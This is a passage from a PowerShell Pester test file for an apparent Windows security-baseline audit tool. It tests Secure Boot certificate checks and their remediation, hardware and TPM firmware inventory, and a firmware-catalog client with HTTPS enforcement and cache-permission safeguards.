        Mock -ModuleName CEAudit Get-Date { [datetime]'2026-12-01' } -ParameterFilter { -not $Date -and -not $Format }
        $f = @(Invoke-CEAuditCore -Id 'SU-01') | Where-Object { -not $_.Subject }
        $f.Status | Should -Be 'Warn'
        $f.Actual | Should -Match '2016.*2027-01-12'

        Mock -ModuleName CEAudit Get-Date { [datetime]'2027-02-01' } -ParameterFilter { -not $Date -and -not $Format }
        $f = @(Invoke-CEAuditCore -Id 'SU-01') | Where-Object { -not $_.Subject }
        $f.Status | Should -Be 'Fail'
        $f.AutoFail | Should -BeTrue
    }

    It 'asks for a manual check on an unknown server build' {
        Set-TestDevice -Kind Secure -ContextOverride @{ OSFamily = 'Windows Server'; EditionClass = 'Server'; Build = 9600; FullBuild = '9600.1' }
        $f = @(Invoke-CEAuditCore -Id 'SU-01') | Where-Object { -not $_.Subject }
        $f.Status | Should -Be 'Manual'
    }
}

Describe 'Secure Boot 2023 certificates (NC-08)' {
    BeforeEach {
        Set-TestDevice -Kind Secure
        $reg = $global:CETestReg
        $reg.Remove('HKLM:\SYSTEM\CurrentControlSet\Control\SecureBoot\Servicing|UEFICA2023Status')
        $reg.Remove('HKLM:\SYSTEM\CurrentControlSet\Control\SecureBoot\Servicing|WindowsUEFICA2023Capable')
        $global:CETestSbVars = @{ db = 'Microsoft Windows Production PCA 2011 Microsoft Corporation UEFI CA 2011'; KEK = 'Microsoft Corporation KEK CA 2011' }
        $global:CETestCtx.AuditTime = [datetime]'2026-05-01'
    }

    It 'the fake Secure Boot data contains every certificate name the config says is replaced' {
        $cfg = Get-Content (Join-Path (Join-Path $script:RepoRoot 'config') 'secure-boot.json') -Raw | ConvertFrom-Json
        foreach ($kind in 'Secure', 'Insecure') {
            Set-TestDevice -Kind $kind
            foreach ($cert in @($cfg.certificates)) {
                $global:CETestSbVars[[string]$cert.variable] | Should -BeLike "*$($cert.replaces)*" -Because "$kind device $($cert.variable) should hold '$($cert.replaces)'"
            }
        }
    }

    It 'passes when the 2023 certificates and boot manager are in place' {
        Set-TestDevice -Kind Secure
        $f = @(Invoke-CEAuditCore -Id 'NC-08')
        $f.Count | Should -Be 5
        @($f | Where-Object Status -ne 'Pass').FindingId | Should -BeNullOrEmpty
    }

    It 'warns before the 2011 CAs expire and offers the fix' {
        $f = @(Invoke-CEAuditCore -Id 'NC-08')
        $kek = $f | Where-Object Subject -eq 'Microsoft Corporation KEK 2K CA 2023'
        $db = $f | Where-Object Subject -eq 'Windows UEFI CA 2023'
        $kek.Status | Should -Be 'Warn'
        $kek.Actual | Should -Match 'expires on 2026-06-24'
        $db.Status | Should -Be 'Warn'
        $db.Remediation.Id | Should -Be 'SecureBoot-Deploy2023Certs'
        ($f | Where-Object Subject -eq 'Microsoft UEFI CA 2023').Severity | Should -Be 'Low'
        ($f | Where-Object Subject -eq 'Boot manager').Status | Should -Be 'Warn'
        $cs = New-CEChangeset -Findings $f -Context (New-TestContext)
        @($cs.Items | Where-Object RemediationId -eq 'SecureBoot-Deploy2023Certs').Count | Should -Be 1
        ($cs.Items | Where-Object RemediationId -eq 'SecureBoot-Deploy2023Certs').Selected | Should -BeFalse
    }

    It 'fails once the replaced CA has expired' {
        $global:CETestCtx.AuditTime = [datetime]'2026-10-20'
        $f = @(Invoke-CEAuditCore -Id 'NC-08')
        ($f | Where-Object Subject -eq 'Windows UEFI CA 2023').Status | Should -Be 'Fail'
        ($f | Where-Object Subject -eq 'Windows UEFI CA 2023').Actual | Should -Match 'expired on 2026-10-19'
        ($f | Where-Object Subject -eq 'Microsoft Corporation KEK 2K CA 2023').Status | Should -Be 'Fail'
    }

    It 'skips the optional third-party CAs when the 2011 third-party CA is not trusted' {
        $global:CETestSbVars.db = 'Microsoft Windows Production PCA 2011'
        $f = @(Invoke-CEAuditCore -Id 'NC-08')
        @($f | Where-Object Subject -match 'Microsoft UEFI CA 2023|Option ROM').Count | Should -Be 0
    }

    It 'points at the manufacturer when event 1803 says there is no PK-signed KEK' {
        $global:CETestSbEvents = @([pscustomobject]@{ Id = 1803; TimeCreated = [datetime]'2026-04-30' })
        $f = @(Invoke-CEAuditCore -Id 'NC-08')
        $kek = $f | Where-Object Subject -eq 'Microsoft Corporation KEK 2K CA 2023'
        $kek.Recommendation | Should -Match 'manufacturer'
        $kek.Remediation | Should -BeNullOrEmpty
        ($f | Where-Object Subject -eq 'Windows UEFI CA 2023').Remediation.Id | Should -Be 'SecureBoot-Deploy2023Certs'
        @($kek.Evidence) | Should -Contain 'Event 1803 last logged 2026-04-30 00:00'
    }

    It 'asks for a restart instead of a fix while an update is in progress' {
        $global:CETestReg['HKLM:\SYSTEM\CurrentControlSet\Control\SecureBoot\Servicing|UEFICA2023Status'] = 'InProgress'
        $global:CETestReg['HKLM:\SYSTEM\CurrentControlSet\Control\SecureBoot\Servicing|WindowsUEFICA2023Capable'] = 1
        $f = @(Invoke-CEAuditCore -Id 'NC-08')
        @($f | Where-Object { $_.Remediation }).Count | Should -Be 0
        ($f | Where-Object Subject -eq 'Windows UEFI CA 2023').Recommendation | Should -Match 'restart'
    }

    It 'treats event 1800 as in progress only when no success event is newer' {
        $global:CETestSbEvents = @([pscustomobject]@{ Id = 1800; TimeCreated = [datetime]'2026-04-29' })
        $f = @(Invoke-CEAuditCore -Id 'NC-08')
        @($f | Where-Object { $_.Remediation }).Count | Should -Be 0

        $global:CETestSbEvents = @([pscustomobject]@{ Id = 1800; TimeCreated = [datetime]'2026-04-28' }, [pscustomobject]@{ Id = 1036; TimeCreated = [datetime]'2026-04-29' })
        $f = @(Invoke-CEAuditCore -Id 'NC-08')
        ($f | Where-Object Subject -eq 'Windows UEFI CA 2023').Remediation.Id | Should -Be 'SecureBoot-Deploy2023Certs'
        ($f | Where-Object Subject -eq 'Windows UEFI CA 2023').Recommendation | Should -Not -Match 'already in progress'

        $global:CETestSbEvents = @([pscustomobject]@{ Id = 1036; TimeCreated = [datetime]'2026-04-28' }, [pscustomobject]@{ Id = 1800; TimeCreated = [datetime]'2026-04-29' })
        $f = @(Invoke-CEAuditCore -Id 'NC-08')
        @($f | Where-Object { $_.Remediation }).Count | Should -Be 0
    }

    It 'reports an unreadable variable as Manual' {
        $global:CETestSbVars = @{ db = $null; KEK = $null }
        $f = @(Invoke-CEAuditCore -Id 'NC-08')
        ($f | Where-Object Subject -eq 'Windows UEFI CA 2023').Status | Should -Be 'Manual'
    }

    It 'is not applicable when Secure Boot is off' {
        $global:CETestSecure = $false
        $f = @(Invoke-CEAuditCore -Id 'NC-08')
        $f.Status | Should -Be 'NotApplicable'
    }

    It 'the fix refuses to run without Secure Boot, and otherwise sets the trigger and starts the task' {
        InModuleScope CEAudit {
            Mock New-ItemProperty { $script:sbSet = "$Name=$Value" }
            Mock Start-ScheduledTask { $script:sbTask = "$TaskPath$TaskName" }
            $global:CETestSecure = $false
            (Invoke-CERemediation -Id 'SecureBoot-Deploy2023Certs' -Parameters @{}).Status | Should -Be 'Failed'
            $global:CETestSecure = $true
            $r = Invoke-CERemediation -Id 'SecureBoot-Deploy2023Certs' -Parameters @{}
            $r.Status | Should -Be 'Applied'
            $script:sbSet | Should -Be 'AvailableUpdates=22852'
            @($r.Undo).Count | Should -Be 1
            $r.Undo[0].Command | Should -Match "-Name 'AvailableUpdates' -Value 0 -Type DWord$"
            $script:sbTask | Should -Be '\Microsoft\Windows\PI\Secure-Boot-Update'
        }
    }
}

Describe 'Hardware inventory and firmware (SU-08)' {
    Context 'version ranges' {
        It 'compares on the precision of the bounds' {
            InModuleScope CEAudit {
                Test-CEVersionInRange -Version '4.33.4' -From '4.0' -To '4.33' | Should -BeTrue
                Test-CEVersionInRange -Version '4.34.0' -From '4.0' -To '4.33' | Should -BeFalse
                Test-CEVersionInRange -Version '4.41.2' -From '4.40' -To '4.42' | Should -BeTrue
                Test-CEVersionInRange -Version '7.63.3353.0' -From '7.0' -To '7.61' | Should -BeFalse
                Test-CEVersionInRange -Version '11.8.50.3399' -From '11.8.0' -To '11.8.69' | Should -BeTrue
                Test-CEVersionInRange -Version '11.8.70.1' -From '11.8.0' -To '11.8.69' | Should -BeFalse
                Test-CEVersionInRange -Version '73.8.17568.5511' -From '73.8' -To '73.8' | Should -BeTrue
                Test-CEVersionInRange -Version '' -From '1.0' -To '2.0' | Should -BeFalse
                Test-CEVersionInRange -Version 'abc' -From '1.0' -To '2.0' | Should -BeFalse
            }
        }

        It 'every advisory in the shipped list is well formed' {
            $list = Get-Content (Join-Path (Join-Path $script:RepoRoot 'config') 'tpm-firmware-advisories.json') -Raw | ConvertFrom-Json
            $list.lastReviewed | Should -Match '^\d{4}-\d{2}-\d{2}$'
            foreach ($a in @($list.advisories)) {
                @($a.manufacturers).Count | Should -BeGreaterThan 0 -Because $a.id
                @($a.cves).Count | Should -BeGreaterThan 0 -Because $a.id
                $a.advice | Should -Not -BeNullOrEmpty -Because $a.id
                foreach ($r in @($a.affected)) {
                    InModuleScope CEAudit -Parameters @{ R = $r; Id = $a.id } {
                        param($R, $Id)
                        Test-CEVersionInRange -Version $R.from -From $R.from -To $R.to | Should -BeTrue -Because "$Id $($R.from)-$($R.to)"
                        Test-CEVersionInRange -Version $R.to -From $R.from -To $R.to | Should -BeTrue -Because "$Id $($R.from)-$($R.to)"
                    }
                }
            }
        }
    }

    Context 'collection' {
        It 'reads model, serial, BIOS, TPM, CPU and disks from CIM and the registry' {
            InModuleScope CEAudit {
                Mock Get-CimInstance {
                    switch ($ClassName) {
                        'Win32_ComputerSystem' { [pscustomobject]@{ Manufacturer = 'Dell Inc. '; Model = 'Latitude 7450'; SystemSKUNumber = '0C9E' } }
                        'Win32_BIOS' { [pscustomobject]@{ Manufacturer = 'Dell Inc.'; SMBIOSBIOSVersion = '1.12.1'; ReleaseDate = [datetime]'2025-03-04'; SerialNumber = 'ABC1234' } }
                        'Win32_BaseBoard' { [pscustomobject]@{ Manufacturer = 'Dell Inc.'; Product = '0ABC12' } }
                        'Win32_Tpm' { [pscustomobject]@{ ManufacturerId = [uint32]0x49465800; ManufacturerVersion = '7.85.4555.0'; SpecVersion = '2.0, 0, 1.59' } }
                        'Win32_Processor' { [pscustomobject]@{ Name = ' Intel(R) Core(TM) Ultra 7 165U '; Manufacturer = 'GenuineIntel'; NumberOfCores = 12; NumberOfLogicalProcessors = 14 } }
                        'Win32_DiskDrive' { [pscustomobject]@{ Model = 'KIOXIA 512GB'; FirmwareRevision = '11100106'; InterfaceType = 'SCSI'; Size = [uint64]512110190592; SerialNumber = ' 8CE3_8E10 ' } }
                    }
                }
                Mock Get-CERegistryValue {
                    if ($Name -eq 'PEFirmwareType') { return 2 }
                    if ($Name -eq 'Update Revision') { return [byte[]]@(0, 0, 0, 0, 0x1C, 0, 0, 0) }
                    return $Default
                }
                $hw = Get-CEHardwareInventory -IsElevated $true
                $hw.Manufacturer | Should -Be 'Dell Inc.'
                $hw.Model | Should -Be 'Latitude 7450'
                $hw.SystemSku | Should -Be '0C9E'
                $hw.SerialNumber | Should -Be 'ABC1234'
                $hw.Baseboard | Should -Be 'Dell Inc. 0ABC12'
                $hw.IsVirtualMachine | Should -BeFalse
                $hw.Firmware.Version | Should -Be '1.12.1'
                $hw.Firmware.ReleaseDate | Should -Be '2025-03-04'
                $hw.Firmware.Type | Should -Be 'UEFI'
                $hw.Tpm.Readable | Should -BeTrue
                $hw.Tpm.Manufacturer | Should -Be 'IFX'
                $hw.Tpm.FirmwareVersion | Should -Be '7.85.4555.0'
                $hw.Tpm.SpecVersion | Should -Be '2.0'
                $hw.Cpu[0].Name | Should -Be 'Intel(R) Core(TM) Ultra 7 165U'
                $hw.Cpu[0].MicrocodeRevision | Should -Be '0x1C' -Because 'older Intel systems store 8 bytes with the revision in the upper half'
                $hw.Disks[0].SizeGB | Should -Be 477
                $hw.Disks[0].SerialNumber | Should -Be '8CE3_8E10'
                @($hw.Errors).Count | Should -Be 0
            }
        }

        It 'does not read the TPM without elevation, and survives missing or odd CIM data' {
            InModuleScope CEAudit {
                Mock Get-CimInstance {
                    if ($ClassName -eq 'Win32_DiskDrive') { throw 'Access denied' }
                    [pscustomobject]@{ PartOfDomain = $false }
                }
                Mock Get-CERegistryValue { $Default }
                $hw = Get-CEHardwareInventory -IsElevated $false
                $hw.Tpm.Readable | Should -BeFalse
                $hw.Firmware.ReleaseDate | Should -BeNullOrEmpty
                @($hw.Cpu).Count | Should -Be 0
                @($hw.Disks).Count | Should -Be 0
                @($hw.Errors) -join ' ' | Should -Match 'Win32_DiskDrive'
                Should -Invoke Get-CimInstance -Times 0 -ParameterFilter { $ClassName -eq 'Win32_Tpm' }
            }
        }

        It 'parses DMTF date strings and flags virtual machines' {
            InModuleScope CEAudit {
                Mock Get-CimInstance {
                    switch ($ClassName) {
                        'Win32_ComputerSystem' { [pscustomobject]@{ Manufacturer = 'Microsoft Corporation'; Model = 'Virtual Machine' } }
                        'Win32_BIOS' { [pscustomobject]@{ ReleaseDate = '20240115000000.000000+000' } }
                    }
                }
                Mock Get-CERegistryValue { $Default }
                $hw = Get-CEHardwareInventory -IsElevated $true
                $hw.IsVirtualMachine | Should -BeTrue
                $hw.Firmware.ReleaseDate | Should -Be '2024-01-15'
                Mock Get-CERegistryValue { if ($Name -eq 'Update Revision') { return [byte[]]@(0x22, 0x01, 0, 0) } $Default }
                Mock Get-CimInstance { if ($ClassName -eq 'Win32_Processor') { [pscustomobject]@{ Name = 'CPU' } } }
                (Get-CEHardwareInventory).Cpu[0].MicrocodeRevision | Should -Be '0x122' -Because 'newer systems store the 4-byte revision'
                $hw.Tpm.Present | Should -BeFalse
            }
        }
    }

    Context 'SU-08' {
        It 'passes a recent BIOS and patched TPM firmware' {
            Set-TestDevice -Kind Secure
            $f = @(Invoke-CEAuditCore -Id 'SU-08')
            ($f | Where-Object Subject -eq 'Firmware').Status | Should -Be 'Pass'
            ($f | Where-Object Subject -eq 'TPM firmware').Status | Should -Be 'Pass'
            ($f | Where-Object Subject -eq 'TPM firmware').Actual | Should -Match 'no known advisories'
        }

        It 'warns on old BIOS and fails ROCA-affected TPM firmware' {
            Set-TestDevice -Kind Insecure
            $f = @(Invoke-CEAuditCore -Id 'SU-08')
            $bios = $f | Where-Object Subject -eq 'Firmware'
            $bios.Status | Should -Be 'Warn'
            $bios.Actual | Should -Match 'months ago'
            $bios.Recommendation | Should -Match 'Contoso Laptop 14 G5'
            $tpm = $f | Where-Object Subject -eq 'TPM firmware'
            $tpm.FindingId | Should -Be 'SU-08:TPM-firmware'
            $tpm.Status | Should -Be 'Fail'
            $tpm.Severity | Should -Be 'High'
            $tpm.Actual | Should -Match 'CVE-2017-15361'
            $tpm.AutoFail | Should -BeFalse
        }

        It 'uses the configured age threshold' {
            Set-TestDevice -Kind Secure
            $global:CETestCtx.Hardware.Firmware.ReleaseDate = $global:CETestCtx.AuditTime.AddDays(-731).ToString('yyyy-MM-dd')
            (@(Invoke-CEAuditCore -Id 'SU-08') | Where-Object Subject -eq 'Firmware').Status | Should -Be 'Warn'
            $global:CETestCtx.Hardware.Firmware.ReleaseDate = $global:CETestCtx.AuditTime.AddDays(-729).ToString('yyyy-MM-dd')
            (@(Invoke-CEAuditCore -Id 'SU-08') | Where-Object Subject -eq 'Firmware').Status | Should -Be 'Pass'
        }

        It 'skips BIOS age on virtual machines and asks for elevation for the TPM' {
            Set-TestDevice -Kind Secure
            $global:CETestCtx.Hardware.IsVirtualMachine = $true
            $global:CETestCtx.Hardware.Tpm.Readable = $false
            $global:CETestCtx.IsElevated = $false
            $f = @(Invoke-CEAuditCore -Id 'SU-08')
            ($f | Where-Object Subject -eq 'Firmware').Status | Should -Be 'NotApplicable'
            ($f | Where-Object Subject -eq 'TPM firmware').Status | Should -Be 'Manual'
            ($f | Where-Object Subject -eq 'TPM firmware').Actual | Should -Match 'elevation'
        }

        It 'is Manual when the context has no hardware inventory' {
            Set-TestDevice -Kind Secure
            $global:CETestCtx.PSObject.Properties.Remove('Hardware')
            (@(Invoke-CEAuditCore -Id 'SU-08')).Status | Should -Be 'Manual'
        }
    }

    Context 'output' {
        It 'shows the hardware in both reports and a summary in status.json' {
            Set-TestDevice -Kind Insecure
            $f = @(Invoke-CEAuditCore)
            $out = Join-Path $TestDrive 'hw'
            $r = Export-CEReport -Findings $f -Context $global:CETestCtx -OutputPath $out
            $md = Get-Content $r.Paths.Markdown -Raw
            $md | Should -Match '## Device hardware'
            $md | Should -Match '\| Serial number \| SN-TEST-001 \|'
            $md | Should -Match '\| Model \| Contoso Laptop 14 G5 \(SKU CT14G5\) \|'
            $md | Should -Match 'IFX firmware 7\.40\.2098\.0, TPM 2\.0'
            $html = Get-Content $r.Paths.Html -Raw
            $html | Should -Match '<h2>Device hardware</h2>'
            $html | Should -Match 'Contoso NVMe 1TB, 954 GB'
            (Get-Content $r.Paths.Findings -Raw | ConvertFrom-Json).Context.Hardware.Model | Should -Be 'Laptop 14 G5'

            $status = InModuleScope CEAudit -Parameters @{ F = $f; S = $r.Summary; C = $global:CETestCtx } { param($F, $S, $C) ConvertTo-CEStatus -Findings $F -Summary $S -Context $C -ReportFolder 'X' }
            $status.Hardware.SerialNumber | Should -Be 'SN-TEST-001'
            $status.Hardware.TpmFirmware | Should -Be '7.40.2098.0'
            $status.Hardware.Disks[0].Firmware | Should -Be '4B2QJXD7'
            $status.Checks.'SU-08'.status | Should -Be 'Fail'
            $path = InModuleScope CEAudit -Parameters @{ S = $status; P = (Join-Path $TestDrive 'hw-status.json') } { param($S, $P) Write-CEStatus -Status $S -Path $P }
            (Get-Content $path -Raw | ConvertFrom-Json).Hardware.Model | Should -Be 'Laptop 14 G5'
        }

        It 'reports without hardware still render (older context objects)' {
            Set-TestDevice -Kind Secure
            $ctx = New-TestContext
            $ctx.PSObject.Properties.Remove('Hardware')
            $r = Export-CEReport -Findings @(Invoke-CEAuditCore -Id 'NC-07') -Context $ctx -OutputPath (Join-Path $TestDrive 'nohw')
            (Get-Content $r.Paths.Markdown -Raw) | Should -Not -Match 'Device hardware'
        }
    }
}

Describe 'Firmware catalog (SU-08 with the catalog service)' {
    BeforeAll {
        function global:New-TestCatalogRecord {
            param([string]$Vendor = 'dell', [string]$Id = 'CT14', [object[]]$Releases, [datetime]$CheckedAt = (Get-Date))
            [pscustomobject]@{
                schemaVersion = 1; vendor = $Vendor; id = $Id; name = 'Contoso Laptop 14 G5'
                latest = $Releases[0]; releases = $Releases; source = 'https://example.test'; sourceUpdatedAt = $null
                catalogVersion = $null; checkedAt = $CheckedAt.ToUniversalTime().ToString('o')
            }
        }
        function global:New-TestRelease { param([string]$Version, [int]$DaysAgo, [string]$Criticality = $null)
            [pscustomobject]@{ version = $Version; date = (Get-Date).Date.AddDays(-$DaysAgo).ToString('yyyy-MM-dd'); criticality = $Criticality }
        }
        function global:Set-TestCatalog {
            param($Record, [string]$Status = 'Found', [string]$Installed = '1.14.1', [string]$Manufacturer = 'Dell Inc.')
            Set-TestDevice -Kind Secure
            $global:CETestCtx.Hardware.Manufacturer = $Manufacturer
            $global:CETestCtx.Hardware.Firmware.Version = $Installed
            $global:CETestCatalog = [pscustomobject]@{ Status = $Status; Record = $Record; FromCache = $false; Message = 'test'; Key = $null }
            Mock -ModuleName CEAudit Get-CEFirmwareCatalogRecord { $global:CETestCatalog }
        }
        $script:firmwareOf = { @(Invoke-CEAuditCore -Id 'SU-08') | Where-Object Subject -eq 'Firmware' }
    }

    Context 'keys and versions' {
        It 'derives the catalog key from the hardware inventory' {
            InModuleScope CEAudit {
                (Get-CEFirmwareCatalogKey ([pscustomobject]@{ Manufacturer = 'Dell Inc.'; SystemSku = '0cf1' })).Id | Should -Be '0CF1'
                (Get-CEFirmwareCatalogKey ([pscustomobject]@{ Manufacturer = 'HP'; BaseboardProduct = '8B41' })).Vendor | Should -Be 'hp'
                (Get-CEFirmwareCatalogKey ([pscustomobject]@{ Manufacturer = 'Hewlett-Packard'; BaseboardProduct = '8B41' })).Id | Should -Be '8B41'
                $l = Get-CEFirmwareCatalogKey ([pscustomobject]@{ Manufacturer = 'LENOVO'; Model = '21KCCTO1WW'; SystemSku = 'LENOVO_MT_21KC_BU_Think_FM_ThinkPad X1 Carbon Gen 12' })
                "$($l.Vendor)/$($l.Id)" | Should -Be 'lenovo/21KC'
                Get-CEFirmwareCatalogKey ([pscustomobject]@{ Manufacturer = 'Microsoft Corporation'; Model = 'Surface Laptop 7' }) | Should -BeNullOrEmpty
                Get-CEFirmwareCatalogKey ([pscustomobject]@{ Manufacturer = 'Dell Inc.'; SystemSku = '../x' }) | Should -BeNullOrEmpty
            }
        }

        It 'compares BIOS versions the way each vendor reports them' {
            InModuleScope CEAudit {
                Compare-CEFirmwareVersion -Vendor 'dell' -Installed '1.14.1' -Catalog '1.17.0' | Should -Be -1
                Compare-CEFirmwareVersion -Vendor 'dell' -Installed '1.17.0' -Catalog '1.17.0' | Should -Be 0
                Compare-CEFirmwareVersion -Vendor 'dell' -Installed '1.10.0' -Catalog '1.9.1' | Should -Be 1
                Compare-CEFirmwareVersion -Vendor 'dell' -Installed 'A24' -Catalog '1.17.0' | Should -BeNullOrEmpty
                Compare-CEFirmwareVersion -Vendor 'hp' -Installed 'V70 Ver. 01.13.01' -Catalog '01.13.01' | Should -Be 0
                Compare-CEFirmwareVersion -Vendor 'hp' -Installed 'V70 Ver. 01.12.01' -Catalog '01.13.01' | Should -Be -1
                Compare-CEFirmwareVersion -Vendor 'lenovo' -Installed 'N3YET84W (1.49 )' -Catalog '1.50' | Should -Be -1
                Compare-CEFirmwareVersion -Vendor 'lenovo' -Installed 'M11KT56A' -Catalog 'M11KT55A' | Should -Be 1
                Compare-CEFirmwareVersion -Vendor 'lenovo' -Installed 'M1XKT63A' -Catalog 'M11KT56A' | Should -BeNullOrEmpty
                Compare-CEFirmwareVersion -Vendor 'lenovo' -Installed 'N3YET84W' -Catalog '1.50' | Should -BeNullOrEmpty
            }
        }
    }

    Context 'client' {
        BeforeEach {
            $script:dataRoot = Join-Path $TestDrive ([guid]::NewGuid().ToString('n'))
            # The cache lives in a test folder the runner's own account can write to. CI runs
            # elevated, where that folder would rightly be distrusted, so run these as a standard user.
            Mock -ModuleName CEAudit Test-CEIsAdmin { $false }
            InModuleScope CEAudit -Parameters @{ Root = $script:dataRoot } {
                param($Root)
                $script:CEDataRootOverride = $Root
                $script:origCatalogCfg = (Get-CEConfig).'firmware-catalog'
                (Get-CEConfig).'firmware-catalog' = [pscustomobject]@{ baseUrl = 'http://localhost:8787/'; timeoutSeconds = 5; cacheHours = 12; maxRecordAgeDays = 7 }
            }
            $script:hw = [pscustomobject]@{ Manufacturer = 'Dell Inc.'; SystemSku = '0CF1' }
        }
        AfterEach {
            InModuleScope CEAudit { $script:CEDataRootOverride = $null; (Get-CEConfig).'firmware-catalog' = $script:origCatalogCfg }
        }

        It 'ships turned on, pointing at the https service' {
            $cfg = Get-Content (Join-Path (Join-Path $script:RepoRoot 'config') 'firmware-catalog.json') -Raw | ConvertFrom-Json
            $cfg.baseUrl | Should -Match '^https://'
        }

        It 'is off when no base URL is configured' {
            InModuleScope CEAudit {
                (Get-CEConfig).'firmware-catalog' = [pscustomobject]@{ baseUrl = '' }
                Mock Invoke-CEHttpGet { throw 'should not be called' }
                (Get-CEFirmwareCatalogRecord -Hardware ([pscustomobject]@{ Manufacturer = 'Dell Inc.'; SystemSku = '0CF1' })).Status | Should -Be 'Disabled'
            }
        }

        It 'refuses plain http except for localhost' {
            InModuleScope CEAudit -Parameters @{ Hw = $script:hw } {
                param($Hw)
                Mock Invoke-CEHttpGet { throw 'should not be called' }
                (Get-CEConfig).'firmware-catalog'.baseUrl = 'http://catalog.example.com'
                $r = Get-CEFirmwareCatalogRecord -Hardware $Hw
                $r.Status | Should -Be 'Error'
                $r.Message | Should -Match 'https'
                Should -Invoke Invoke-CEHttpGet -Times 0
            }
        }

        It 'fetches, validates and caches a record, then reuses the cache' {
            InModuleScope CEAudit -Parameters @{ Hw = $script:hw } {
                param($Hw)
                $body = New-TestCatalogRecord -Vendor 'dell' -Id '0CF1' -Releases @(New-TestRelease '1.17.0' 30 'Urgent') | ConvertTo-Json -Depth 5
                Mock Invoke-CEHttpGet { [pscustomobject]@{ StatusCode = 200; Body = $body; ETag = '"abc"' } }
                $r = Get-CEFirmwareCatalogRecord -Hardware $Hw
                $r.Status | Should -Be 'Found'
                $r.Record.releases[0].version | Should -Be '1.17.0'
                Should -Invoke Invoke-CEHttpGet -Times 1 -ParameterFilter { $Uri -eq 'http://localhost:8787/v1/firmware/dell/0CF1' }
                $again = Get-CEFirmwareCatalogRecord -Hardware $Hw
                $again.FromCache | Should -BeTrue
                Should -Invoke Invoke-CEHttpGet -Times 1
            }
        }

        It 'revalidates an old cache with its ETag and falls back to it when the service is down' {
            InModuleScope CEAudit -Parameters @{ Hw = $script:hw } {
                param($Hw)
                $body = New-TestCatalogRecord -Vendor 'dell' -Id '0CF1' -Releases @(New-TestRelease '1.17.0' 30) | ConvertTo-Json -Depth 5
                Mock Invoke-CEHttpGet { [pscustomobject]@{ StatusCode = 200; Body = $body; ETag = '"abc"' } }
                Get-CEFirmwareCatalogRecord -Hardware $Hw | Out-Null
                (Get-CEConfig).'firmware-catalog'.cacheHours = 0
                Mock Invoke-CEHttpGet { [pscustomobject]@{ StatusCode = 304; Body = ''; ETag = '"abc"' } }
                $r = Get-CEFirmwareCatalogRecord -Hardware $Hw
                $r.Status | Should -Be 'Found'
                $r.Message | Should -Match 'confirmed'
                Should -Invoke Invoke-CEHttpGet -Times 1 -ParameterFilter { $ETag -eq '"abc"' }
                Mock Invoke-CEHttpGet { throw 'No connection could be made' }
                $down = Get-CEFirmwareCatalogRecord -Hardware $Hw
                $down.Status | Should -Be 'Found'
                $down.FromCache | Should -BeTrue
                $down.Message | Should -Match 'unreachable'
            }
        }

        It 'does not read a cached record that standard users could change, even in a trusted cache folder' {
            # A file keeps the owner who created it, even in a folder the install locked later.
            InModuleScope CEAudit -Parameters @{ Hw = $script:hw } {
                param($Hw)
                $body = New-TestCatalogRecord -Vendor 'dell' -Id '0CF1' -Releases @(New-TestRelease '1.17.0' 30) | ConvertTo-Json -Depth 5
                Mock Invoke-CEHttpGet { [pscustomobject]@{ StatusCode = 200; Body = $body; ETag = '"abc"' } }
                Get-CEFirmwareCatalogRecord -Hardware $Hw | Out-Null
                Mock Test-CEIsAdmin { $true }
                Mock Get-CEPathAclProblem { if ($Path -like '*.json') { "$Path is owned by S-1-5-21-1-2-3-1001" } }
                Mock Invoke-CEHttpGet { throw 'No connection could be made' }
                $r = Get-CEFirmwareCatalogRecord -Hardware $Hw
                $r.FromCache | Should -BeFalse
                $r.Status | Should -Be 'Error'
                Mock Get-CEPathAclProblem { }
                (Get-CEFirmwareCatalogRecord -Hardware $Hw).FromCache | Should -BeTrue -Because 'an admin-only cache file is still used'
            }
        }

        It 'does not read or write the cache when the data folder itself is untrusted, even if cache and the file are not' {
            # The data folder is checked as well as cache\ and the file, as Get-CEConfig and packs do:
            # whoever can write %ProgramData%\EngramicBaseline could replace cache\ wholesale.
            InModuleScope CEAudit -Parameters @{ Hw = $script:hw; Root = $script:dataRoot } {
                param($Hw, $Root)
                $body = New-TestCatalogRecord -Vendor 'dell' -Id '0CF1' -Releases @(New-TestRelease '1.17.0' 30) | ConvertTo-Json -Depth 5
                Mock Invoke-CEHttpGet { [pscustomobject]@{ StatusCode = 200; Body = $body; ETag = '"abc"' } }
                Get-CEFirmwareCatalogRecord -Hardware $Hw | Out-Null      # a valid record is now cached
                $cacheFile = Join-Path (Join-Path $Root 'cache') 'firmware-dell-0CF1.json'
                Test-Path -LiteralPath $cacheFile | Should -BeTrue

                # Elevated, with only the data root flagged (cache\ and the file look admin-only).
                Mock Test-CEIsAdmin { $true }
                Mock Get-CEPathAclProblem { if ($Path -eq $Root) { "$Path is owned by S-1-5-21-1-2-3-1001" } }
                Mock Invoke-CEHttpGet { throw 'No connection could be made' }
                $r = Get-CEFirmwareCatalogRecord -Hardware $Hw
                $r.FromCache | Should -BeFalse -Because 'a forged record could sit in a cache folder inside a data folder the user controls'
                $r.Status | Should -Be 'Error'

                # And a fresh fetch is not written back into the untrusted data folder.
                $before = (Get-Item -LiteralPath $cacheFile).LastWriteTimeUtc
                Mock Invoke-CEHttpGet { [pscustomobject]@{ StatusCode = 200; Body = $body; ETag = '"xyz"' } }
                Get-CEFirmwareCatalogRecord -Hardware $Hw | Out-Null
                (Get-Item -LiteralPath $cacheFile).LastWriteTimeUtc | Should -Be $before -Because 'SYSTEM must not write into a folder a standard user could redirect'

                Mock Get-CEPathAclProblem { }
                (Get-CEFirmwareCatalogRecord -Hardware $Hw).FromCache | Should -BeTrue -Because 'a trusted data folder reads the cache again'
            }
        }

        It 'reports unknown models, bad records and failures without a cache' {
            InModuleScope CEAudit -Parameters @{ Hw = $script:hw } {
                param($Hw)
                Mock Invoke-CEHttpGet { [pscustomobject]@{ StatusCode = 404; Body = '{"error":"unknown-model"}'; ETag = '' } }
                (Get-CEFirmwareCatalogRecord -Hardware $Hw).Status | Should -Be 'NotFound'
                $wrong = New-TestCatalogRecord -Vendor 'hp' -Id '8B41' -Releases @(New-TestRelease '1.0' 1) | ConvertTo-Json -Depth 5
                Mock Invoke-CEHttpGet { [pscustomobject]@{ StatusCode = 200; Body = $wrong; ETag = '' } }
                (Get-CEFirmwareCatalogRecord -Hardware $Hw).Message | Should -Match 'invalid'
                Mock Invoke-CEHttpGet { throw (New-Object System.Net.Http.HttpRequestException('An error occurred while sending the request.', (New-Object System.Net.WebException('The remote name could not be resolved: catalog.example')))) }
                $err = Get-CEFirmwareCatalogRecord -Hardware $Hw
                $err.Status | Should -Be 'Error'
